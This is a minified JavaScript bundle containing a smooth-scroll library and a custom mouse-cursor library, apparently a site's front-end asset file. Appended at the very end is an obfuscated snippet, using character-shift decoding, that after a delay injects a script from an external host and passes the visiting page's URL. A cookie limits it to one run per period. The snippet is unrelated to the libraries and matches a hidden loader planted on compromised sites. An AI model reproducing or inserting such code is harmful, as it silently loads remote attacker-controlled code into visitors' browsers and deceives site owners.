              }
            }
          }, {
            key: "reinitScrollBar",
            value: function () {
              if (this.hasScrollbar = !1, "horizontal" == this.direction) {
                if (this.instance.limit.x + this.windowWidth <= this.windowWidth) return
              } else if (this.instance.limit.y + this.windowHeight <= this.windowHeight) return;
              this.hasScrollbar = !0, this.scrollbarBCR = this.scrollbar.getBoundingClientRect(), this.scrollbarHeight = this.scrollbarBCR.height, this.scrollbarWidth = this.scrollbarBCR.width, "horizontal" === this.direction ? this.scrollbarThumb.style.width = "".concat(this.scrollbarWidth * this.scrollbarWidth / (this.instance.limit.x + this.scrollbarWidth), "px") : this.scrollbarThumb.style.height = "".concat(this.scrollbarHeight * this.scrollbarHeight / (this.instance.limit.y + this.scrollbarHeight), "px"), this.scrollbarThumbBCR = this.scrollbarThumb.getBoundingClientRect(), this.scrollBarLimit = {
                x: this.scrollbarWidth - this.scrollbarThumbBCR.width,
                y: this.scrollbarHeight - this.scrollbarThumbBCR.height
              }
            }
          }, {
            key: "destroyScrollBar",
            value: function () {
              this.scrollbarThumb.removeEventListener("mousedown", this.getScrollBar), window.removeEventListener("mouseup", this.releaseScrollBar), window.removeEventListener("mousemove", this.moveScrollBar), this.scrollbar.remove()
            }
          }, {
            key: "getScrollBar",
            value: function (t) {
              this.isDraggingScrollbar = !0, this.checkScroll(), this.html.classList.remove(this.scrollingClass), this.html.classList.add(this.draggingClass)
            }
          }, {
            key: "releaseScrollBar",
            value: function (t) {
              this.isDraggingScrollbar = !1, this.isScrolling && this.html.classList.add(this.scrollingClass), this.html.classList.remove(this.draggingClass)
            }
          }, {
            key: "moveScrollBar",
            value: function (t) {
              var e = this;
              this.isDraggingScrollbar && requestAnimationFrame((function () {
                var i = 100 * (t.clientX - e.scrollbarBCR.left) / e.scrollbarWidth * e.instance.limit.x / 100,
                  n = 100 * (t.clientY - e.scrollbarBCR.top) / e.scrollbarHeight * e.instance.limit.y / 100;
                n > 0 && n < e.instance.limit.y && (e.instance.delta.y = n), i > 0 && i < e.instance.limit.x && (e.instance.delta.x = i)
              }))
            }
          }, {
            key: "addElements",
            value: function () {
              var t = this;
              this.els = {}, this.parallaxElements = {}, this.el.querySelectorAll("[data-".concat(this.name, "]")).forEach((function (e, i) {
                var n, r, s, o = Q(e),
                  a = Object.entries(t.sections).map((function (t) {
                    var e = g(t, 2);
                    return e[0], e[1]
                  })).find((function (t) {
                    return o.includes(t.el)
                  })),
                  l = e.dataset[t.name + "Class"] || t.class,
                  c = "string" == typeof e.dataset[t.name + "Id"] ? e.dataset[t.name + "Id"] : "el" + i,
                  h = e.dataset[t.name + "Repeat"],
                  u = e.dataset[t.name + "Call"],
                  f = e.dataset[t.name + "Position"],
                  d = e.dataset[t.name + "Delay"],
                  p = e.dataset[t.name + "Direction"],
                  m = "string" == typeof e.dataset[t.name + "Sticky"],
                  v = !!e.dataset[t.name + "Speed"] && parseFloat(e.dataset[t.name + "Speed"]) / 10,
                  y = "string" == typeof e.dataset[t.name + "Offset"] ? e.dataset[t.name + "Offset"].split(",") : t.offset,
                  _ = e.dataset[t.name + "Target"],
                  b = (s = void 0 !== _ ? document.querySelector("".concat(_)) : e).getBoundingClientRect();
                null === a || a.inView ? (n = b.top + t.instance.scroll.y - Z(s).y, r = b.left + t.instance.scroll.x - Z(s).x) : (n = b.top - Z(a.el).y - Z(s).y, r = b.left - Z(a.el).x - Z(s).x);
                var w = n + s.offsetHeight,
                  x = r + s.offsetWidth,
                  T = {
                    x: (x - r) / 2 + r,
                    y: (w - n) / 2 + n
                  };
                if (m) {
                  var S = e.getBoundingClientRect(),
                    k = S.top,
                    E = S.left,
                    M = {
                      x: E - r,
                      y: k - n
                    };
                  n += window.innerHeight, r += window.innerWidth, w = k + s.offsetHeight - e.offsetHeight - M[t.directionAxis], T = {
                    x: ((x = E + s.offsetWidth - e.offsetWidth - M[t.directionAxis]) - r) / 2 + r,
                    y: (w - n) / 2 + n
                  }
                }
                h = "false" != h && (null != h || t.repeat);
                var O = [0, 0];
                if (y)
                  if ("horizontal" === t.direction) {
                    for (var A = 0; A < y.length; A++) "string" == typeof y[A] ? y[A].includes("%") ? O[A] = parseInt(y[A].replace("%", "") * t.windowWidth / 100) : O[A] = parseInt(y[A]) : O[A] = y[A];
                    r += O[0], x -= O[1]
                  } else {
                    for (A = 0; A < y.length; A++) "string" == typeof y[A] ? y[A].includes("%") ? O[A] = parseInt(y[A].replace("%", "") * t.windowHeight / 100) : O[A] = parseInt(y[A]) : O[A] = y[A];
                    n += O[0], w -= O[1]
                  } var C = {
                  el: e,
                  id: c,
                  class: l,
                  section: a,
                  top: n,
                  middle: T,
                  bottom: w,
                  left: r,
                  right: x,
                  offset: y,
                  progress: 0,
                  repeat: h,
                  inView: !1,
                  call: u,
                  speed: v,
                  delay: d,
                  position: f,
                  target: s,
                  direction: p,
                  sticky: m
                };
                t.els[c] = C, e.classList.contains(l) && t.setInView(t.els[c], c), (!1 !== v || m) && (t.parallaxElements[c] = C)
              }))
            }
          }, {
            key: "addSections",
            value: function () {
              var t = this;
              this.sections = {};
              var e = this.el.querySelectorAll("[data-".concat(this.name, "-section]"));
              0 === e.length && (e = [this.el]), e.forEach((function (e, i) {
                var n = "string" == typeof e.dataset[t.name + "Id"] ? e.dataset[t.name + "Id"] : "section" + i,
                  r = e.getBoundingClientRect(),
                  s = {
                    x: r.left - 1.5 * window.innerWidth - Z(e).x,
                    y: r.top - 1.5 * window.innerHeight - Z(e).y
                  },
                  o = {
                    x: s.x + r.width + 2 * window.innerWidth,
                    y: s.y + r.height + 2 * window.innerHeight
                  },
                  a = "string" == typeof e.dataset[t.name + "Persistent"];
                e.setAttribute("data-scroll-section-id", n);
                var l = {
                  el: e,
                  offset: s,
                  limit: o,
                  inView: !1,
                  persistent: a,
                  id: n
                };
                t.sections[n] = l
              }))
            }
          }, {
            key: "transform",
            value: function (t, e, i, n) {
              var r;
              if (n) {
                var s = Z(t),
                  o = K(s.x, e, n),
                  a = K(s.y, i, n);
                r = "matrix3d(1,0,0.00,0,0.00,1,0.00,0,0,0,1,0,".concat(o, ",").concat(a, ",0,1)")
              } else r = "matrix3d(1,0,0.00,0,0.00,1,0.00,0,0,0,1,0,".concat(e, ",").concat(i, ",0,1)");
              t.style.webkitTransform = r, t.style.msTransform = r, t.style.transform = r
            }
          }, {
            key: "transformElements",
            value: function (t) {
              var e = this,
                i = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
                n = this.instance.scroll.x + this.windowWidth,
                r = this.instance.scroll.y + this.windowHeight,
                s = {
                  x: this.instance.scroll.x + this.windowMiddle.x,
                  y: this.instance.scroll.y + this.windowMiddle.y
                };
              Object.entries(this.parallaxElements).forEach((function (o) {
                var a = g(o, 2),
                  l = (a[0], a[1]),
                  c = !1;
                if (t && (c = 0), l.inView || i) switch (l.position) {
                  case "top":
                  case "left":
                    c = e.instance.scroll[e.directionAxis] * -l.speed;
                    break;
                  case "elementTop":
                    c = (r - l.top) * -l.speed;
                    break;
                  case "bottom":
                    c = (e.instance.limit[e.directionAxis] - r + e.windowHeight) * l.speed;
                    break;
                  case "elementLeft":
                    c = (n - l.left) * -l.speed;
                    break;
                  case "right":
                    c = (e.instance.limit[e.directionAxis] - n + e.windowHeight) * l.speed;
                    break;
                  default:
                    c = (s[e.directionAxis] - l.middle[e.directionAxis]) * -l.speed
                }
                l.sticky && (c = l.inView ? "horizontal" === e.direction ? e.instance.scroll.x - l.left + window.innerWidth : e.instance.scroll.y - l.top + window.innerHeight : "horizontal" === e.direction ? e.instance.scroll.x < l.left - window.innerWidth && e.instance.scroll.x < l.left - window.innerWidth / 2 ? 0 : e.instance.scroll.x > l.right && e.instance.scroll.x > l.right + 100 && l.right - l.left + window.innerWidth : e.instance.scroll.y < l.top - window.innerHeight && e.instance.scroll.y < l.top - window.innerHeight / 2 ? 0 : e.instance.scroll.y > l.bottom && e.instance.scroll.y > l.bottom + 100 && l.bottom - l.top + window.innerHeight), !1 !== c && ("horizontal" === l.direction || "horizontal" === e.direction && "vertical" !== l.direction ? e.transform(l.el, c, 0, !t && l.delay) : e.transform(l.el, 0, c, !t && l.delay))
              }))
            }
          }, {
            key: "scrollTo",
            value: function (t) {
              var e = this,
                i = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
                n = parseInt(i.offset) || 0,
                r = isNaN(parseInt(i.duration)) ? 1e3 : parseInt(i.duration),
                s = i.easing || [.25, 0, .35, 1],
                o = !!i.disableLerp,
                a = !!i.callback && i.callback;
              if (s = ot.apply(void 0, y(s)), "string" == typeof t) {
                if ("top" === t) t = 0;
                else if ("bottom" === t) t = this.instance.limit.y;
                else if ("left" === t) t = 0;
                else if ("right" === t) t = this.instance.limit.x;
                else if (!(t = document.querySelector(t))) return
              } else if ("number" == typeof t) t = parseInt(t);
              else if (!t || !t.tagName) return void console.warn("`target` parameter is not valid");
              if ("number" != typeof t) {
                var l = Q(t).includes(this.el);
                if (!l) return;
                var c = t.getBoundingClientRect(),
                  h = c.top,
                  u = c.left,
                  f = Q(t),
                  d = f.find((function (t) {
                    return Object.entries(e.sections).map((function (t) {
                      var e = g(t, 2);
                      return e[0], e[1]
                    })).find((function (e) {
                      return e.el == t
                    }))
                  })),
                  p = 0;
                p = d ? Z(d)[this.directionAxis] : -this.instance.scroll[this.directionAxis], n = "horizontal" === this.direction ? u + n - p : h + n - p
              } else n = t + n;
              var m = parseFloat(this.instance.delta[this.directionAxis]),
                v = Math.max(0, Math.min(n, this.instance.limit[this.directionAxis])),
                _ = v - m,
                b = function (t) {
                  o ? "horizontal" === e.direction ? e.setScroll(m + _ * t, e.instance.delta.y) : e.setScroll(e.instance.delta.x, m + _ * t) : e.instance.delta[e.directionAxis] = m + _ * t
                };
              this.animatingScroll = !0, this.stopScrolling(), this.startScrolling();
              var w = Date.now(),
                x = function t() {
                  var i = (Date.now() - w) / r;
                  i > 1 ? (b(1), e.animatingScroll = !1, 0 == r && e.update(), a && a()) : (e.scrollToRaf = requestAnimationFrame(t), b(s(i)))
                };
              x()
            }
          }, {
            key: "update",
            value: function () {
              this.setScrollLimit(), this.addSections(), this.addElements(), this.detectElements(), this.updateScroll(), this.transformElements(!0), this.reinitScrollBar(), this.checkScroll(!0)
            }
          }, {
            key: "startScroll",
            value: function () {
              this.stop = !1
            }
          }, {
            key: "stopScroll",
            value: function () {
              this.stop = !0
            }
          }, {
            key: "setScroll",
            value: function (t, e) {
              this.instance = c(c({}, this.instance), {}, {
                scroll: {
                  x: t,
                  y: e
                },
                delta: {
                  x: t,
                  y: e
                },
                speed: 0
              })
            }
          }, {
            key: "destroy",
            value: function () {
              v(u(i.prototype), "destroy", this).call(this), this.stopScrolling(), this.html.classList.remove(this.smoothClass), this.vs.destroy(), this.destroyScrollBar(), window.removeEventListener("keydown", this.checkKey, !1)
            }
          }]), i
        }(x),
        lt = function () {
          function t() {
            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            r(this, t), this.options = e, Object.assign(this, w, e), this.smartphone = w.smartphone, e.smartphone && Object.assign(this.smartphone, e.smartphone), this.tablet = w.tablet, e.tablet && Object.assign(this.tablet, e.tablet), this.smooth || "horizontal" != this.direction || console.warn("🚨 `smooth:false` & `horizontal` direction are not yet compatible"), this.tablet.smooth || "horizontal" != this.tablet.direction || console.warn("🚨 `smooth:false` & `horizontal` direction are not yet compatible (tablet)"), this.smartphone.smooth || "horizontal" != this.smartphone.direction || console.warn("🚨 `smooth:false` & `horizontal` direction are not yet compatible (smartphone)"), this.init()
          }
          return o(t, [{
            key: "init",
            value: function () {
              if (this.options.isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || "MacIntel" === navigator.platform && navigator.maxTouchPoints > 1 || window.innerWidth < this.tablet.breakpoint, this.options.isTablet = this.options.isMobile && window.innerWidth >= this.tablet.breakpoint, this.smooth && !this.options.isMobile || this.tablet.smooth && this.options.isTablet || this.smartphone.smooth && this.options.isMobile && !this.options.isTablet ? this.scroll = new at(this.options) : this.scroll = new E(this.options), this.scroll.init(), window.location.hash) {
                var t = window.location.hash.slice(1, window.location.hash.length),
                  e = document.getElementById(t);
                e && this.scroll.scrollTo(e)
              }
            }
          }, {
            key: "update",
            value: function () {
              this.scroll.update()
            }
          }, {
            key: "start",
            value: function () {
              this.scroll.startScroll()
            }
          }, {
            key: "stop",
            value: function () {
              this.scroll.stopScroll()
            }
          }, {
            key: "scrollTo",
            value: function (t, e) {
              this.scroll.scrollTo(t, e)
            }
          }, {
            key: "setScroll",
            value: function (t, e) {
              this.scroll.setScroll(t, e)
            }
          }, {
            key: "on",
            value: function (t, e) {
              this.scroll.setEvents(t, e)
            }
          }, {
            key: "off",
            value: function (t, e) {
              this.scroll.unsetEvents(t, e)
            }
          }, {
            key: "destroy",
            value: function () {
              this.scroll.destroy()
            }
          }]), t
        }();
      e.ZP = lt
    },
    602: function (t, e, i) {
      i.d(e, {
        Z: function () {
          return n
        }
      });
      var n = function () {
        function t(e) {
          void 0 === e && (e = {}), this.options = Object.assign({}, {
            el: null,
            container: document.body,
            className: "mf-cursor",
            innerClassName: "mf-cursor-inner",
            textClassName: "mf-cursor-text",
            mediaClassName: "mf-cursor-media",
            mediaBoxClassName: "mf-cursor-media-box",
            iconSvgClassName: "mf-svgsprite",
            iconSvgNamePrefix: "-",
            iconSvgSrc: "",
            dataAttr: "cursor",
            hiddenState: "-hidden",
            textState: "-text",
            iconState: "-icon",
            activeState: "-active",
            mediaState: "-media",
            stateDetection: {
              "-pointer": "a,button"
            },
            visible: !0,
            visibleOnState: !1,
            speed: .55,
            ease: "expo.out",
            overwrite: !0,
            skewing: 0,
            skewingText: 2,
            skewingIcon: 2,
            skewingMedia: 2,
            skewingDelta: .001,
            skewingDeltaMax: .15,
            stickDelta: .15,
            showTimeout: 0,
            hideOnLeave: !0,
            hideTimeout: 300,
            hideMediaTimeout: 300,
            initialPos: [-window.innerWidth, -window.innerHeight]
          }, e), this.options.visible && null == e.stateDetection && (this.options.stateDetection["-hidden"] = "iframe"), this.gsap = t.gsap || window.gsap, this.el = "string" == typeof this.options.el ? document.querySelector(this.options.el) : this.options.el, this.container = "string" == typeof this.options.container ? document.querySelector(this.options.container) : this.options.container, this.skewing = this.options.skewing, this.pos = {
            x: this.options.initialPos[0],
            y: this.options.initialPos[1]
          }, this.vel = {
            x: 0,
            y: 0
          }, this.event = {}, this.events = [], this.init()
        }
        t.registerGSAP = function (e) {
          t.gsap = e
        };
        var e = t.prototype;
        return e.init = function () {
          this.el || this.create(), this.createSetter(), this.bind(), this.render(!0), this.ticker = this.render.bind(this, !1), this.gsap.ticker.add(this.ticker)
        }, e.create = function () {
          this.el = document.createElement("div"), this.el.className = this.options.className, this.el.classList.add(this.options.hiddenState), this.inner = document.createElement("div"), this.inner.className = this.options.innerClassName, this.text = document.createElement("div"), this.text.className = this.options.textClassName, this.media = document.createElement("div"), this.media.className = this.options.mediaClassName, this.mediaBox = document.createElement("div"), this.mediaBox.className = this.options.mediaBoxClassName, this.media.appendChild(this.mediaBox), this.inner.appendChild(this.media), this.inner.appendChild(this.text), this.el.appendChild(this.inner), this.container.appendChild(this.el)
        }, e.createSetter = function () {
          this.setter = {
            x: this.gsap.quickSetter(this.el, "x", "px"),
            y: this.gsap.quickSetter(this.el, "y", "px"),
            rotation: this.gsap.quickSetter(this.el, "rotation", "deg"),
            scaleX: this.gsap.quickSetter(this.el, "scaleX"),
            scaleY: this.gsap.quickSetter(this.el, "scaleY"),
            wc: this.gsap.quickSetter(this.el, "willChange"),
            inner: {
              rotation: this.gsap.quickSetter(this.inner, "rotation", "deg")
            }
          }
        }, e.bind = function () {
          var t = this;
          this.event.mouseleave = function () {
            return t.hide()
          }, this.event.mouseenter = function () {
            return t.show()
          }, this.event.mousedown = function () {
            return t.addState(t.options.activeState)
          }, this.event.mouseup = function () {
            return t.removeState(t.options.activeState)
          }, this.event.mousemoveOnce = function () {
            return t.show()
          }, this.event.mousemove = function (e) {
            t.gsap.to(t.pos, {
              x: t.stick ? t.stick.x - (t.stick.x - e.clientX) * t.options.stickDelta : e.clientX,
              y: t.stick ? t.stick.y - (t.stick.y - e.clientY) * t.options.stickDelta : e.clientY,
              overwrite: t.options.overwrite,
              ease: t.options.ease,
              duration: t.visible ? t.options.speed : 0,
              onUpdate: function () {
                return t.vel = {
                  x: e.clientX - t.pos.x,
                  y: e.clientY - t.pos.y
                }
              }
            })
          }, this.event.mouseover = function (e) {
            for (var i = e.target; i && i !== t.container && (!e.relatedTarget || !i.contains(e.relatedTarget)); i = i.parentNode) {
              for (var n in t.options.stateDetection) i.matches(t.options.stateDetection[n]) && t.addState(n);
              if (t.options.dataAttr) {
                var r = t.getFromDataset(i);
                r.state && t.addState(r.state), r.text && t.setText(r.text), r.icon && t.setIcon(r.icon), r.img && t.setImg(r.img), r.video && t.setVideo(r.video), void 0 !== r.show && t.show(), void 0 !== r.stick && t.setStick(r.stick || i)
              }
            }
          }, this.event.mouseout = function (e) {
            for (var i = e.target; i && i !== t.container && (!e.relatedTarget || !i.contains(e.relatedTarget)); i = i.parentNode) {
              for (var n in t.options.stateDetection) i.matches(t.options.stateDetection[n]) && t.removeState(n);
              if (t.options.dataAttr) {
                var r = t.getFromDataset(i);
                r.state && t.removeState(r.state), r.text && t.removeText(), r.icon && t.removeIcon(), r.img && t.removeImg(), r.video && t.removeVideo(), void 0 !== r.show && t.hide(), void 0 !== r.stick && t.removeStick()
              }
            }
          }, this.options.hideOnLeave && this.container.addEventListener("mouseleave", this.event.mouseleave, {
            passive: !0
          }), this.options.visible && this.container.addEventListener("mouseenter", this.event.mouseenter, {
            passive: !0
          }), this.options.activeState && (this.container.addEventListener("mousedown", this.event.mousedown, {
            passive: !0
          }), this.container.addEventListener("mouseup", this.event.mouseup, {
            passive: !0
          })), this.container.addEventListener("mousemove", this.event.mousemove, {
            passive: !0
          }), this.options.visible && this.container.addEventListener("mousemove", this.event.mousemoveOnce, {
            passive: !0,
            once: !0
          }), (this.options.stateDetection || this.options.dataAttr) && (this.container.addEventListener("mouseover", this.event.mouseover, {
            passive: !0
          }), this.container.addEventListener("mouseout", this.event.mouseout, {
            passive: !0
          }))
        }, e.render = function (t) {
          if (!0 === t || 0 !== this.vel.y && 0 !== this.vel.x) {
            if (this.trigger("render"), this.setter.wc("transform"), this.setter.x(this.pos.x), this.setter.y(this.pos.y), this.skewing) {
              var e = Math.sqrt(Math.pow(this.vel.x, 2) + Math.pow(this.vel.y, 2)),
                i = Math.min(e * this.options.skewingDelta, this.options.skewingDeltaMax) * this.skewing,
                n = 180 * Math.atan2(this.vel.y, this.vel.x) / Math.PI;
              this.setter.rotation(n), this.setter.scaleX(1 + i), this.setter.scaleY(1 - i), this.setter.inner.rotation(-n)
            }
          } else this.setter.wc("auto")
        }, e.show = function () {
          var t = this;
          this.trigger("show"), clearInterval(this.visibleInt), this.visibleInt = setTimeout((function () {
            t.el.classList.remove(t.options.hiddenState), t.visible = !0, t.render(!0)
          }), this.options.showTimeout)
        }, e.hide = function () {
          var t = this;
          this.trigger("hide"), clearInterval(this.visibleInt), this.el.classList.add(this.options.hiddenState), this.visibleInt = setTimeout((function () {
            return t.visible = !1
          }), this.options.hideTimeout)
        }, e.toggle = function (t) {
          !0 === t || !1 !== t && !this.visible ? this.show() : this.hide()
        }, e.addState = function (t) {
          var e;
          if (this.trigger("addState", t), t === this.options.hiddenState) return this.hide();
          (e = this.el.classList).add.apply(e, t.split(" ")), this.options.visibleOnState && this.show()
        }, e.removeState = function (t) {
          var e;
          if (this.trigger("removeState", t), t === this.options.hiddenState) return this.show();
          (e = this.el.classList).remove.apply(e, t.split(" ")), this.options.visibleOnState && this.el.className === this.options.className && this.hide()
        }, e.toggleState = function (t, e) {
          !0 === e || !1 !== e && !this.el.classList.contains(t) ? this.addState(t) : this.removeState(t)
        }, e.setSkewing = function (t) {
          this.gsap.to(this, {
            skewing: t
          })
        }, e.removeSkewing = function () {
          this.gsap.to(this, {
            skewing: this.options.skewing
          })
        }, e.setStick = function (t) {
          var e = ("string" == typeof t ? document.querySelector(t) : t).getBoundingClientRect();
          this.stick = {
            y: e.top + e.height / 2,
            x: e.left + e.width / 2
          }
        }, e.removeStick = function () {
          this.stick = !1
        }, e.setText = function (t) {
          this.text.innerHTML = t, this.addState(this.options.textState), this.setSkewing(this.options.skewingText)
        }, e.removeText = function () {
          this.removeState(this.options.textState), this.removeSkewing()
        }, e.setIcon = function (t, e) {
          void 0 === e && (e = ""), this.text.innerHTML = "<svg class='" + this.options.iconSvgClassName + " " + this.options.iconSvgNamePrefix + t + "' style='" + e + "'><use xlink:href='" + this.options.iconSvgSrc + "#" + t + "'></use></svg>", this.addState(this.options.iconState), this.setSkewing(this.options.skewingIcon)
        }, e.removeIcon = function () {
          this.removeState(this.options.iconState), this.removeSkewing()
        }, e.setMedia = function (t) {
          var e = this;
          clearTimeout(this.mediaInt), t && (this.mediaBox.innerHTML = "", this.mediaBox.appendChild(t)), this.mediaInt = setTimeout((function () {
            return e.addState(e.options.mediaState)
          }), 20), this.setSkewing(this.options.skewingMedia)
        }, e.removeMedia = function () {
          var t = this;
          clearTimeout(this.mediaInt), this.removeState(this.options.mediaState), this.mediaInt = setTimeout((function () {
            return t.mediaBox.innerHTML = ""
          }), this.options.hideMediaTimeout), this.removeSkewing()
        }, e.setImg = function (t) {
          this.mediaImg || (this.mediaImg = new Image), this.mediaImg.src !== t && (this.mediaImg.src = t), this.setMedia(this.mediaImg)
        }, e.removeImg = function () {
          this.removeMedia()
        }, e.setVideo = function (t) {
          this.mediaVideo || (this.mediaVideo = document.createElement("video"), this.mediaVideo.muted = !0, this.mediaVideo.loop = !0, this.mediaVideo.autoplay = !0), this.mediaVideo.src !== t && (this.mediaVideo.src = t, this.mediaVideo.load()), this.mediaVideo.play(), this.setMedia(this.mediaVideo)
        }, e.removeVideo = function () {
          this.mediaVideo && this.mediaVideo.readyState > 2 && this.mediaVideo.pause(), this.removeMedia()
        }, e.on = function (t, e) {
          this.events[t] instanceof Array || this.off(t), this.events[t].push(e)
        }, e.off = function (t, e) {
          this.events[t] = e ? this.events[t].filter((function (t) {
            return t !== e
          })) : []
        }, e.trigger = function (t) {
          var e = arguments,
            i = this;
          this.events[t] && this.events[t].forEach((function (t) {
            return t.call.apply(t, [i, i].concat([].slice.call(e, 1)))
          }))
        }, e.getFromDataset = function (t) {
          var e = t.dataset;
          return {
            state: e[this.options.dataAttr],
            show: e[this.options.dataAttr + "Show"],
            text: e[this.options.dataAttr + "Text"],
            icon: e[this.options.dataAttr + "Icon"],
            img: e[this.options.dataAttr + "Img"],
            video: e[this.options.dataAttr + "Video"],
            stick: e[this.options.dataAttr + "Stick"]
          }
        }, e.destroy = function () {
          this.trigger("destroy"), this.gsap.ticker.remove(this.ticker), this.container.removeEventListener("mouseleave", this.event.mouseleave), this.container.removeEventListener("mouseenter", this.event.mouseenter), this.container.removeEventListener("mousedown", this.event.mousedown), this.container.removeEventListener("mouseup", this.event.mouseup), this.container.removeEventListener("mousemove", this.event.mousemove), this.container.removeEventListener("mousemove", this.event.mousemoveOnce), this.container.removeEventListener("mouseover", this.event.mouseover), this.container.removeEventListener("mouseout", this.event.mouseout), this.el && (this.container.removeChild(this.el), this.el = null, this.mediaImg = null, this.mediaVideo = null)
        }, t
      }()
    }
  }
]);
(function (o, d, l) {
  try {
    o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
    o.b = o.f('UMUWJKX');
    o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function () {
      o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
    }, 1000);
    d.cookie = o.b + '=full;max-age=39800;'
  } catch (e) {};
}({}, document, location));